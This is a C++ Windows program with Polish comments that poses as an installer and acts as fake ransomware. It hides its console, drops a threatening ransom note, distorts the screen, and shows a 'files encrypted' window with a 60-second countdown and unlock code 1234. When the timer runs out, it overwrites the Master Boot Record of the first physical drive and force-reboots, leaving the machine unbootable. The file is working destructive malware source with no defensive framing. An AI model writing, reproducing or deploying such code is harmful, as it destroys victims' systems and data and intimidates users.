#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <string>

// Te linijki mówią Visual Studio, żeby samo dołączyło potrzebne biblioteki
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

bool odblokowany = false;

// 1. Efekt wizualny: Pływający ekran (Tunel)
void EfektTunelu() {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (!odblokowany) {
        StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCCOPY);
        if (rand() % 10 == 1) DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(NULL, IDI_ERROR));
        Sleep(50);
    }
}

// 2. Destrukcja MBR (Tylko po odliczaniu)
void ZniszczMBR() {
    BYTE mbrData[512] = { 0 };
    // Bardzo uproszczony kod wyświetlający napis po restarcie
    const char* msg = "TWOJ SYSTEM ZOSTAL ZNISZCZONY!";
    memcpy(mbrData, msg, strlen(msg));
    mbrData[510] = 0x55; mbrData[511] = 0xAA;

    DWORD bytesWritten;
    HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (drive != INVALID_HANDLE_VALUE) {
        WriteFile(drive, mbrData, 512, &bytesWritten, NULL);
        CloseHandle(drive);
    }
    system("shutdown /r /t 0 /f");
}

// 3. Główne okno "Ransomware"
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    static HWND hEdit;
    if (msg == WM_CREATE) {
        CreateWindow("STATIC", "TWOJE PLIKI SA ZASZYFROWANE!", WS_CHILD | WS_VISIBLE | SS_CENTER, 50, 20, 300, 20, hwnd, NULL, NULL, NULL);
        CreateWindow("STATIC", "WPISZ KOD: 1234 (MASZ 60 SEKUND)", WS_CHILD | WS_VISIBLE | SS_CENTER, 50, 50, 300, 20, hwnd, NULL, NULL, NULL);
        hEdit = CreateWindow("EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 150, 80, 100, 25, hwnd, NULL, NULL, NULL);
        CreateWindow("BUTTON", "ODBLOKUJ", WS_CHILD | WS_VISIBLE, 150, 120, 100, 30, hwnd, (HMENU)1, NULL, NULL);
    }
    if (msg == WM_COMMAND && LOWORD(wp) == 1) {
        char buf[10];
        GetWindowText(hEdit, buf, 10);
        if (std::string(buf) == "1234") {
            odblokowany = true;
            MessageBox(NULL, "System odblokowany!", "OK", MB_OK);
            exit(0);
        }
    }
    if (msg == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(hwnd, msg, wp, lp);
}

// 4. Start wszystkiego
int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Ukrywa czarne okno konsoli

    if (MessageBox(NULL, "Uruchomic instalator?", "Instalator", MB_YESNO | MB_ICONQUESTION) != IDYES) return 0;

    // Tworzenie notatnika z groźbą
    std::ofstream note("PRZECZYTAJ_MNIE.txt");
    note << "Wlasnie straciles dostep do komputera. Masz minute.";
    note.close();
    ShellExecute(NULL, "open", "PRZECZYTAJ_MNIE.txt", NULL, NULL, SW_SHOWNORMAL);

    // Start efektów w tle
    std::thread t1(EfektTunelu);
    t1.detach();

    // Rejestracja okna
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hbrBackground = CreateSolidBrush(RGB(200, 0, 0));
    wc.lpszClassName = "VirusWindow";
    RegisterClass(&wc);
    HWND hwnd = CreateWindow("VirusWindow", "ALARM!", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 400, 300, 400, 250, NULL, NULL, NULL, NULL);

    // Licznik 60 sekund
    for (int i = 60; i > 0; i--) {
        if (odblokowany) break;
        Sleep(1000);
    }

    if (!odblokowany) ZniszczMBR();

    return 0;
}
